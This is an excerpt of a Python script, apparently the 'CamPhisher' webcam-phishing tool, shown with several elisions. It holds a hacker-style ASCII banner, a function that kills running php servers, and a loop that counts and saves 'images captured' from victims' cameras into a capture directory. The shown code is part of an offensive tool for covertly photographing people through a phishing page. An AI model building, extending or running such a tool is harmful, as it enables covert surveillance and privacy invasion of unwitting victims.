...
CAP_DIR =  f'{path_to_script}/capture'
...
if not path.isdir(CAP_DIR):
        mkdir(CAP_DIR)

def stop():
    checkphp = subprocess.check_output(["ps", "aux"]).decode('utf-8')
    if 'php' in checkphp:
        subprocess.run(["killall", "-2", "php"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
...
\_   ___ \_____    _____\______   \  |__ |__| ______ ____   ____ |  | __ ___________ 
/    \  \/\__  \  /     \|     ___/  |  \|  |/  ___// __ \_/ __ \|  |/ // __ \_  __ \
\     \____/ __ \|  Y Y  \    |   |   Y  \  |\___ \\  ___/\  ___/|    <\  ___/|  | \/
 \______  (____  /__|_|  /____|   |___|  /__/____  >\___  >\___  >__|_ \\___  >__|   
        \/     \/      \/              \/        \/     \/     \/     \/    \/        v 1.0 beta'''
	print(f'{W}{R}{art}{W}\n')
	print(f'{G}[>] {C}Developed By   : {R}R̟͚̝d͉͓͖o̢̞̻i̦͓̺x͔̟͙{W}\n')
...
def capture():
    ...
    print(f'{Y}[!] Camera Information :{W}\n')
    while True:
        if os.path.exists("capture.log"):
            os.remove("capture.log")
            capture_count += 1
            print(f'{G}[+] {C}{capture_count} {W}images captured!')
            start_time = time.time()
        if time.time() - start_time > 10:
            if capture_count > 0:
                print(f'\n{G}[+] {C}Total cam files received is {W}{capture_count}, saved at "capture" directory\n')
            break
        time.sleep(1)
